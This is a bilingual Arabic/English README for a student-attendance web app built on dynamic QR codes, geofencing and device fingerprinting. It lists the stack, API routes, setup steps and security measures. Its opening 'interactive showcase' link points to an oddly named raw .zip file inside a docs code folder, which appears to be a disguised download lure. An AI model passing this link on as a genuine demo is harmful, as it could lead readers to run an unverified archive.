# 🎓 نظام حضور الطلاب الذكي
# Smart Student Attendance System

نظام متكامل لإدارة حضور الطلاب باستخدام تقنية QR Code الديناميكية مع التحقق من الموقع الجغرافي والبصمة الرقمية للجهاز.

> 🌟 **عرض تقديمي:** [اضغط هنا لتحميل الـ Showcase التفاعلي](https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip)

---

## 📋 المحتويات

1. [نظرة عامة](#-نظرة-عامة)
2. [الميزات الرئيسية](#-الميزات-الرئيسية)
3. [البنية التقنية](#-البنية-التقنية)
4. [الخوارزميات الأساسية](#-الخوارزميات-الأساسية)
5. [هيكل المشروع](#-هيكل-المشروع)
6. [قاعدة البيانات](#-قاعدة-البيانات)
7. [واجهة برمجة التطبيقات (API)](#-واجهة-برمجة-التطبيقات-api)
8. [الواجهة الأمامية](#-الواجهة-الأمامية)
9. [التثبيت والتشغيل](#-التثبيت-والتشغيل)
10. [الأمان](#-الأمان)
11. [الاختبارات](#-الاختبارات)

---

## 🌟 نظرة عامة

نظام حضور الطلاب الذكي هو تطبيق ويب متكامل يتيح للمؤسسات التعليمية إدارة حضور الطلاب بطريقة آمنة وفعالة. يستخدم النظام رموز QR ديناميكية (تتجدد كل 30 ثانية)، مع التحقق الجغرافي (Geofencing) والبصمة الرقمية للجهاز (Device Fingerprinting) لمنع الغش في التسجيل.

### 👥 أدوار المستخدمين

| الدور | الصلاحيات |
|-------|-----------|
| **الطالب** | مسح QR، عرض سجل الحضور، الإحصائيات الشخصية، إدارة التسجيل في المواد |
| **الأستاذ** | إنشاء الجلسات، توليد QR، عرض حضور الطلاب، الإحصائيات، تقارير PDF |
| **الإداري** | إدارة كاملة: المستخدمين، الأقسام، المراحل، المواد، الترحيل الأكاديمي |

---

## ✨ الميزات الرئيسية

### 🔐 نظام المصادقة والتخويل
- تسجيل دخول متعدد الأدوار (طالب، أستاذ، إداري)
- JWT-based authentication مع Cookie HttpOnly
- إعادة تعيين كلمة المرور عبر البريد الإلكتروني (Nodemailer)
- Rate Limiting للحماية من هجمات Brute Force

### 📱 نظام الحضور بـ QR Code
- توليد رموز QR ديناميكية تتجدد كل 30 ثانية
- التحقق من الموقع الجغرافي (Haversine + Geofencing)
- البصمة الرقمية للجهاز (FingerprintJS) لمنع تزوير التسجيل
- تسجيل ومراقبة المحاولات الفاشلة

### 📊 لوحات التحكم والتقارير
- إحصائيات تفاعلية مع رسوم بيانية (Recharts)
- تقارير حضور تفصيلية قابلة للتصدير إلى PDF (PDFKit + Puppeteer)
- لوحة تحكم مخصصة لكل دور
- عرض المحاولات الفاشلة لكل جلسة

### 👥 إدارة المستخدمين والأكاديمية
- إدارة كاملة للطلاب، الأساتذة، والإداريين
- إدارة الأقسام والمراحل الدراسية والمواد
- ربط الأساتذة بالمواد وإدارة التسجيل

### 🎓 نظام الترحيل الأكاديمي
- ترحيل الطلاب بين المراحل الدراسية
- خدمة `PromotionService` متكاملة مع قاعدة البيانات
- تتبع سجلات الترحيل وإعداد التقارير

### 🔄 مهام الصيانة التلقائية
- مهام Cron Job لتنظيف رموز QR المنتهية الصلاحية
- مهام تنظيف الجلسات المنتهية تلقائياً

---

## 🛠 البنية التقنية

### الخادم الخلفي (Backend)

| التقنية | الإصدار | الوصف |
|---------|---------|-------|
| **Node.js** | v18+ | بيئة التشغيل |
| **Express** | ^5.2.1 | إطار العمل |
| **TypeScript** | ^5.9.3 | لغة البرمجة |
| **Prisma** | ^6.19.0 | ORM لقاعدة البيانات |
| **PostgreSQL** | 15-alpine | قاعدة البيانات الرئيسية |
| **Redis** | 7-alpine | تخزين مؤقت وإدارة الجلسات |
| **JWT** | ^9.0.3 | المصادقة |
| **Bcryptjs** | ^3.0.3 | تشفير كلمات المرور |
| **Helmet** | ^8.1.0 | رؤوس أمان HTTP |
| **Winston** | ^3.19.0 | تسجيل السجلات (Logging) |
| **Sentry** | ^10.44.0 | مراقبة الأخطاء |
| **PDFKit** | ^0.17.2 | توليد تقارير PDF |
| **Puppeteer** | ^24.36.1 | توليد PDF عبر المتصفح |
| **node-cron** | ^4.2.1 | جدولة المهام |
| **@turf/turf** | ^7.2.0 | الحسابات الجغرافية |
| **geolib** | ^3.3.4 | مكتبة الموقع الجغرافي |
| **FingerprintJS** | ^5.0.1 | بصمة الجهاز |

### الواجهة الأمامية (Frontend)

| التقنية | الإصدار | الوصف |
|---------|---------|-------|
| **React** | ^18.3.1 | المكتبة الأساسية |
| **Vite** | ^5.4.21 | أداة البناء السريعة |
| **TypeScript** | ^5.8.3 | لغة البرمجة |
| **React Router DOM** | ^6.30.1 | التنقل بين الصفحات |
| **TanStack Query** | ^5.83.0 | إدارة الحالة والطلبات |
| **Tailwind CSS** | ^3.4.17 | التنسيق |
| **Shadcn/ui + Radix UI** | — | مكونات UI |
| **Recharts** | ^2.15.4 | الرسوم البيانية |
| **html5-qrcode** | ^2.3.8 | قارئ QR Code |
| **React Hook Form + Zod** | — | إدارة النماذج والتحقق |
| **Sentry** | ^10.44.0 | مراقبة الأخطاء |
| **Lucide React** | ^0.462.0 | مكتبة الأيقونات |

### البنية التحتية

| التقنية | الوصف |
|---------|-------|
| **Docker + Docker Compose** | containerization كامل |
| **Traefik** | Reverse Proxy + Load Balancer |
| **Nginx** | خادم الواجهة الأمامية |

---

## 🔬 الخوارزميات الأساسية

يعتمد النظام على مجموعة من الخوارزميات المتقدمة لضمان الأمان والدقة:

| الخوارزمية | الاستخدام |
|-----------|----------|
| **Haversine Formula** | حساب المسافة بين إحداثيات GPS لتطبيق Geofencing |
| **Bcrypt Hashing** | تشفير كلمات المرور (Key Stretching) |
| **HMAC-SHA256** | توقيع وتحقق JWT Tokens |
| **TOTP (Time-Based Dynamic QR)** | توليد رموز QR تتجدد كل 30 ثانية |
| **Browser Fingerprinting (MurmurHash3)** | البصمة الرقمية للجهاز لمنع التزوير |
| **Token Bucket / Sliding Window** | Rate Limiting لحماية API |

> للتفاصيل الكاملة، راجع [`docs/algorithms_used.md`](docs/algorithms_used.md)

---

## 📁 هيكل المشروع

```
system-attendnce/
│
├── Back-end/                          # الخادم الخلفي (Node.js + Express + TypeScript)
│   ├── src/
│   │   ├── server.ts                  # نقطة الدخول الرئيسية
│   │   ├── app.ts                     # إعداد Express وMiddlewares
│   │   └── instrument.ts              # إعداد Sentry
│   │
│   ├── controllers/                   # منطق التحكم لكل مورد
│   │   ├── AuthController.ts          # تسجيل الدخول، JWT، إعادة التعيين
│   │   ├── AttendanceController.ts    # سجلات الحضور والإحصائيات
│   │   ├── AttendanceReportSimple.ts  # توليد تقارير PDF
│   │   ├── DashboardController.ts     # إحصائيات لوحة التحكم
│   │   ├── SessionController.ts       # إدارة جلسات الحضور
│   │   ├── QrcodeController.ts        # توليد والتحقق من QR
│   │   ├── GeofenceController.ts      # إدارة المناطق الجغرافية
│   │   ├── StudentController.ts       # إدارة الطلاب
│   │   ├── TeacherController.ts       # إدارة الأساتذة
│   │   ├── MaterialController.ts      # إدارة المواد الدراسية
│   │   ├── DepartmentController.ts    # إدارة الأقسام
│   │   ├── StageController.ts         # إدارة المراحل الدراسية
│   │   ├── EnrollmentController.ts    # تسجيل الطلاب في المواد
│   │   └── PromotionController.ts     # الترحيل الأكاديمي
│   │
│   ├── routes/                        # تعريف مسارات API
│   │   ├── authRoutes.ts
│   │   ├── attendanceRoutes.ts
│   │   ├── sessionRoutes.ts
│   │   ├── qrcodeRoutes.ts
│   │   ├── geofenceRoutes.ts
│   │   ├── studentRoutes.ts
│   │   ├── teacherRoutes.ts
│   │   ├── materialRoutes.ts
│   │   ├── departmentRoutes.ts
│   │   ├── stageRoutes.ts
│   │   ├── enrollmentRoutes.ts
│   │   ├── promotionRoutes.ts
│   │   └── dashboardRoutes.ts
│   │
│   ├── middleware/                    # Middlewares
│   │   ├── authMiddleware.ts          # التحقق من JWT وصلاحية الدور
│   │   ├── adminMiddleware.ts         # صلاحيات الإداري
│   │   ├── rateLimitMiddleware.ts     # حماية Rate Limiting
│   │   ├── rateLimiter.ts             # إعدادات Redis Rate Limiter
│   │   ├── checkGeofenceMiddlwear.ts  # التحقق من الموقع الجغرافي
│   │   ├── checkDepartmentAccess.ts   # صلاحيات القسم
│   │   ├── requestIdMiddleware.ts     # توليد Request ID
│   │   └── validateRequest.ts         # التحقق من صحة الطلبات
│   │
│   ├── services/
│   │   └── PromotionService.ts        # منطق الترحيل الأكاديمي
│   │
│   ├── prisma/                        # قاعدة البيانات
│   │   ├── schema.prisma              # نموذج البيانات الكامل
│   │   ├── client.ts                  # Prisma Client
│   │   ├── seed.ts                    # بيانات أولية
│   │   ├── seed-admins.ts
│   │   ├── seed-random-students.ts
│   │   ├── seed-random-teachers.ts
│   │   ├── seed-promotion.ts
│   │   └── migrations/                # سجل التحديثات
│   │
│   ├── utils/                         # أدوات مساعدة
│   ├── types/                         # TypeScript types
│   ├── tests/                         # اختبارات الوحدة والتكامل (Jest)
│   │   ├── auth/
│   │   ├── attendance/
│   │   ├── sessions/
│   │   ├── qrcodes/
│   │   ├── geofences/
│   │   ├── departments/
│   │   ├── materials/
│   │   ├── stages/
│   │   └── helpers/
│   │
│   ├── postman/                       # مجموعة Postman لاختبار API
│   ├── assets/                        # ملفات ثابتة (صور، خطوط)
│   ├── Dockerfile
│   ├── .env.example                   # مثال متغيرات البيئة
│   ├── jest.config.js
│   ├── tsconfig.json
│   └── package.json
│
├── front-end/
│   └── smooth-frontend/               # الواجهة الأمامية (React + Vite + TypeScript)
│       ├── src/
│       │   ├── App.tsx                # التوجيه الرئيسي
│       │   ├── main.tsx               # نقطة الدخول
│       │   ├── pages/                 # صفحات التطبيق
│       │   │   ├── Login.tsx
│       │   │   ├── Dashboard.tsx
│       │   │   ├── Sessions.tsx
│       │   │   ├── SessionDetails.tsx
│       │   │   ├── SessionAttendance.tsx
│       │   │   ├── ScanQR.tsx         # قارئ QR Code
│       │   │   ├── Attendance.tsx
│       │   │   ├── AttendanceStats.tsx
│       │   │   ├── TeacherAttendanceStats.tsx
│       │   │   ├── Students.tsx
│       │   │   ├── Teachers.tsx
│       │   │   ├── Materials.tsx
│       │   │   ├── MyMaterials.tsx
│       │   │   ├── MySessions.tsx
│       │   │   ├── MyStudents.tsx
│       │   │   ├── Departments.tsx
│       │   │   ├── Stages.tsx
│       │   │   ├── Geofences.tsx
│       │   │   ├── StudentEnrollments.tsx
│       │   │   ├── StudentPromotion.tsx
│       │   │   ├── StudentLeaves.tsx
│       │   │   ├── PromotionConfig.tsx
│       │   │   ├── FailedAttempts.tsx
│       │   │   ├── Settings.tsx
│       │   │   └── auth/              # صفحات إعادة تعيين كلمة المرور
│       │   │
│       │   ├── components/            # مكونات React قابلة للإعادة
│       │   ├── contexts/              # React Contexts (Auth, Theme)
│       │   ├── hooks/                 # Custom Hooks
│       │   ├── lib/                   # إعدادات API وأدوات
│       │   └── test/                  # اختبارات Vitest
│       │
│       ├── public/
│       ├── Dockerfile
│       ├── nginx.conf
│       ├── tailwind.config.ts
│       ├── vite.config.ts
│       └── package.json
│
├── docs/                              # التوثيق الشامل
│   ├── algorithms_used.md             # شرح الخوارزميات
│   ├── technologies_used.md           # التقنيات المستخدمة
│   ├── architecture.png               # مخطط البنية الكاملة
│   ├── backend_architecture.png       # مخطط الخادم الخلفي
│   ├── frontend_architecture.png      # مخطط الواجهة الأمامية
│   ├── database_architecture.png      # مخطط قاعدة البيانات
│   ├── core_logic_flow.png            # تدفق المنطق الأساسي
│   ├── security_architecture.png      # بنية الأمان
│   ├── INSTALLATION.md                # دليل التثبيت التفصيلي
│   ├── USER_GUIDE.md                  # دليل المستخدم
│   ├── SECURITY.md                    # سياسة الأمان
│   └── GRADUATION_PROJECT_REPORT_AR.md
│
├── docker-compose.yaml                # تشغيل المشروع الكامل بـ Docker
├── DEPLOYMENT_GUIDE_AR.md             # دليل النشر بالعربية
├── SECURITY.md
└── .gitignore
```

---

## 🗄 قاعدة البيانات

### النماذج الرئيسية (Prisma Schema)

| النموذج | الوصف |
|---------|-------|
| `Student` | بيانات الطلاب (الاسم، الرقم الجامعي، القسم، المرحلة) |
| `Teacher` | بيانات الأساتذة وارتباطهم بالمواد |
| `Admin` | بيانات المديرين وصلاحياتهم |
| `Department` | الأقسام الأكاديمية |
| `Stage` | المراحل الدراسية لكل قسم |
| `Material` | المواد الدراسية ومدرسوها |
| `Session` | جلسات الحضور (تاريخ، وقت، مادة) |
| `QRToken` | رموز QR الديناميكية مع وقت انتهاء الصلاحية |
| `AttendanceRecord` | سجلات الحضور لكل طالب وجلسة |
| `FailedAttempt` | المحاولات الفاشلة لمسح QR |
| `Geofence` | المناطق الجغرافية لكل جلسة (مركز + نصف قطر) |
| `Enrollment` | تسجيل الطلاب في المواد |
| `PromotionRecord` | سجلات ترحيل الطلاب بين المراحل |

### مخطط العلاقات

```
Department ──┬── Stage ──── Student ──── AttendanceRecord ──── Session
             │                │                                    │
             ├── Material ────┴──── Enrollment          QRToken ──┘
             │       │
             └── Teacher ──── Session ──── Geofence
                                  │
                              FailedAttempt
```

> للمزيد، راجع [`Back-end/prisma/schema.prisma`](Back-end/prisma/schema.prisma) و [`docs/database_architecture.png`](docs/database_architecture.png)

---

## 🔌 واجهة برمجة التطبيقات (API)

**Base URL:** `http://localhost:4000/api/v1`

### المصادقة `/api/v1/auth`
| الطريقة | المسار | الصلاحية | الوصف |
|---------|--------|----------|-------|
| POST | `/login` | عام | تسجيل الدخول |
| POST | `/logout` | مصادَق | تسجيل الخروج |
| GET | `/profile` | مصادَق | الملف الشخصي |
| POST | `/forgot-password` | عام | طلب إعادة تعيين كلمة المرور |
| POST | `/reset-password` | عام | إعادة تعيين كلمة المرور |

### الجلسات `/api/v1/sessions`
| الطريقة | المسار | الصلاحية | الوصف |
|---------|--------|----------|-------|
| GET | `/` | أستاذ/إداري | جميع الجلسات |
| POST | `/` | أستاذ | إنشاء جلسة جديدة |
| GET | `/:id` | مصادَق | تفاصيل جلسة |
| PATCH | `/:id/end` | أستاذ | إنهاء جلسة |

### QR Code `/api/v1/qrcodes`
| الطريقة | المسار | الصلاحية | الوصف |
|---------|--------|----------|-------|
| POST | `/generate/:session_id` | أستاذ | توليد رمز QR جديد |
| POST | `/validate` | طالب | التحقق من رمز QR وتسجيل الحضور |

### الحضور `/api/v1/attendance`
| الطريقة | المسار | الوصف |
|---------|--------|-------|
| GET | `/` | جميع سجلات الحضور |
| GET | `/student/:id` | حضور طالب معين |
| GET | `/session/:id` | حضور جلسة معينة |
| GET | `/stats` | الإحصائيات |
| GET | `/report/pdf` | تصدير PDF |

### الإدارة
| المسار | الوصف |
|--------|-------|
| `/api/v1/students` | إدارة الطلاب (CRUD) |
| `/api/v1/teachers` | إدارة الأساتذة (CRUD) |
| `/api/v1/departments` | إدارة الأقسام (CRUD) |
| `/api/v1/stages` | إدارة المراحل (CRUD) |
| `/api/v1/materials` | إدارة المواد الدراسية (CRUD) |
| `/api/v1/geofences` | إدارة المناطق الجغرافية (CRUD) |
| `/api/v1/enrollments` | إدارة التسجيل في المواد |
| `/api/v1/promotions` | الترحيل الأكاديمي |
| `/api/v1/dashboard` | إحصائيات لوحة التحكم |

> للتوثيق الكامل، استورد مجموعة Postman من [`Back-end/postman/`](Back-end/postman/)

---

## 💻 الواجهة الأمامية

### الصفحات حسب الدور

#### 🎓 الطالب
| الصفحة | المسار | الوصف |
|--------|--------|-------|
| تسجيل الدخول | `/login` | صفحة الدخول |
| لوحة التحكم | `/dashboard` | نظرة عامة على الحضور |
| مسح QR | `/scan-qr` | مسح رمز QR للحضور |
| حضوري | `/attendance` | سجل حضوري الشخصي |
| إحصائياتي | `/attendance-stats` | إحصائيات الحضور |
| موادي | `/my-materials` | المواد المسجل بها |
| جلساتي | `/my-sessions` | جلساتي |

#### 👨‍🏫 الأستاذ
| الصفحة | المسار | الوصف |
|--------|--------|-------|
| الجلسات | `/sessions` | إنشاء وإدارة الجلسات |
| تفاصيل الجلسة | `/sessions/:id` | تفاصيل جلسة + توليد QR |
| حضور الجلسة | `/sessions/:id/attendance` | قائمة حضور الجلسة |
| طلابي | `/my-students` | الطلاب المرتبطون بموادي |
| إحصائيات الحضور | `/teacher-attendance-stats` | إحصائياتي كأستاذ |
| المحاولات الفاشلة | `/failed-attempts` | مراقبة محاولات الغش |

#### 🔧 الإداري
| الصفحة | المسار | الوصف |
|--------|--------|-------|
| الطلاب | `/students` | إدارة شاملة للطلاب |
| الأساتذة | `/teachers` | إدارة شاملة للأساتذة |
| الأقسام | `/departments` | إدارة الأقسام |
| المراحل | `/stages` | إدارة المراحل الدراسية |
| المواد | `/materials` | إدارة المواد |
| المناطق الجغرافية | `/geofences` | إدارة Geofences |
| التسجيل | `/enrollments` | تسجيل الطلاب في المواد |
| الترحيل | `/student-promotion` | ترحيل الطلاب |
| إعداد الترحيل | `/promotion-config` | إعدادات الترحيل |
| إجازات الطلاب | `/student-leaves` | إدارة إجازات الطلاب |
| الإعدادات | `/settings` | إعدادات الحساب |

---

## 🚀 التثبيت والتشغيل

### المتطلبات المسبقة
- Node.js v18+
- PostgreSQL 14+
- Redis 7+
- Git
- **Docker & Docker Compose** (مستحسن للتشغيل السريع)

---

### 🐳 التشغيل عبر Docker (الأسرع والأسهل)

```bash
# 1. استنساخ المشروع
git clone https://github.com/am17jx/Smart_Student_Attendance_System.git
cd Smart_Student_Attendance_System

# 2. إعداد متغيرات البيئة
cp Back-end/.env.example Back-end/.env
# عدّل Back-end/.env بإعداداتك

# 3. تشغيل المشروع كاملاً
docker-compose up --build
```

بعد التشغيل:
- **الواجهة الأمامية:** `http://localhost`
- **الخادم الخلفي:** `http://localhost/api/v1` (عبر Traefik)
- **قاعدة البيانات:** PostgreSQL على `localhost:5432`
- **Redis:** على `localhost:6379`

---

### 🛠 التثبيت اليدوي (بدون Docker)

#### 1. استنساخ المشروع

```bash
git clone https://github.com/am17jx/Smart_Student_Attendance_System.git
cd Smart_Student_Attendance_System
```

#### 2. إعداد الخادم الخلفي

```bash
cd Back-end

# تثبيت الاعتمادات
npm install

# إعداد ملف البيئة
cp .env.example .env
# عدّل .env بإعداداتك

# تشغيل قاعدة البيانات (Migrations)
npm run prisma:migrate

# بيانات أولية (اختياري)
npm run seed

# إنشاء أول مدير
node create-first-admin.js

# تشغيل الخادم في وضع التطوير
npm run dev
```

#### 3. إعداد الواجهة الأمامية

```bash
cd front-end/smooth-frontend

# تثبيت الاعتمادات
npm install

# تشغيل التطبيق
npm run dev
```

---

### ⚙️ متغيرات البيئة

**`Back-end/.env`** (انسخ من `.env.example`):

```env
# قاعدة البيانات
DATABASE_URL="postgresql://postgres:password@localhost:5432/attendance_system"

# الخادم
PORT=4000
NODE_ENV=development

# المصادقة
JWT_SECRET="your-very-secret-key-here"
JWT_EXPIRES_IN="7d"

# البريد الإلكتروني (Nodemailer)
MAIL_USER=your-email@gmail.com
MAIL_PASS=your-app-password

# Redis
REDIS_URL=redis://localhost:6379

# Sentry (اختياري)
SENTRY_DSN=your-sentry-dsn
```

**`front-end/smooth-frontend/.env`**:

```env
VITE_API_URL=http://localhost:4000/api/v1
```

---

## 🔒 الأمان

### تدابير الحماية المطبقة

| الطبقة | الآلية |
|--------|--------|
| **المصادقة** | JWT مع Cookie HttpOnly |
| **الترخيص** | Role-Based Access Control (RBAC) |
| **كلمات المرور** | Bcrypt مع Salt Rounds |
| **رؤوس HTTP** | Helmet.js |
| **CORS** | Origins محددة |
| **Rate Limiting** | Express Rate Limit + Redis |
| **التحقق الجغرافي** | Haversine + Geofencing |
| **مكافحة الغش** | Browser Fingerprinting (FingerprintJS) |
| **رموز QR** | تتجدد كل 30 ثانية |
| **السجلات** | Winston Logger + Sentry |

### حدود الطلبات (Rate Limits)

| نوع العملية | الحد |
|-------------|------|
| تسجيل الدخول | 5 محاولات / 15 دقيقة |
| مسح QR | 10 محاولات / دقيقة |
| API العام | 100 طلب / 15 دقيقة |
| إعادة تعيين كلمة المرور | 3 طلبات / ساعة |

> للتفاصيل، راجع [`SECURITY.md`](SECURITY.md) و [`docs/SECURITY.md`](docs/SECURITY.md)

---

## 🧪 الاختبارات

### الخادم الخلفي (Jest + Supertest)

```bash
cd Back-end

# تشغيل جميع الاختبارات
npm test

# تشغيل مع تغطية الكود
npm run test:coverage

# وضع المراقبة
npm run test:watch

# مع تفاصيل إضافية
npm run test:verbose
```

**وحدات تغطيها الاختبارات:**
- المصادقة (auth)
- الحضور (attendance)
- الجلسات (sessions)
- رموز QR (qrcodes)
- المناطق الجغرافية (geofences)
- الأقسام والمراحل والمواد

### الواجهة الأمامية (Vitest)

```bash
cd front-end/smooth-frontend

# تشغيل الاختبارات
npm test

# وضع المراقبة
npm run test:watch
```

---

## 🗺 خرائط البنية

| الخريطة | الملف |
|---------|-------|
| البنية الكاملة | [`docs/architecture.png`](docs/architecture.png) |
| بنية الخادم الخلفي | [`docs/backend_architecture.png`](docs/backend_architecture.png) |
| بنية الواجهة الأمامية | [`docs/frontend_architecture.png`](docs/frontend_architecture.png) |
| بنية قاعدة البيانات | [`docs/database_architecture.png`](docs/database_architecture.png) |
| تدفق المنطق الأساسي | [`docs/core_logic_flow.png`](docs/core_logic_flow.png) |
| بنية الأمان | [`docs/security_architecture.png`](docs/security_architecture.png) |

---

## 📚 التوثيق الإضافي

| الوثيقة | الرابط |
|---------|--------|
| دليل التثبيت التفصيلي | [`docs/INSTALLATION.md`](docs/INSTALLATION.md) |
| دليل المستخدم | [`docs/USER_GUIDE.md`](docs/USER_GUIDE.md) |
| الخوارزميات المستخدمة | [`docs/algorithms_used.md`](docs/algorithms_used.md) |
| التقنيات المستخدمة | [`docs/technologies_used.md`](docs/technologies_used.md) |
| دليل النشر (عربي) | [`DEPLOYMENT_GUIDE_AR.md`](DEPLOYMENT_GUIDE_AR.md) |
| سياسة الأمان | [`SECURITY.md`](SECURITY.md) |
| اختبارات الخادم | [`Back-end/tests/README.md`](Back-end/tests/README.md) |

---

## 📄 الترخيص

هذا المشروع مرخص تحت [MIT License](LICENSE).

---

**صُنع بـ ❤️ لمشروع التخرج — نظام الحضور الذكي**
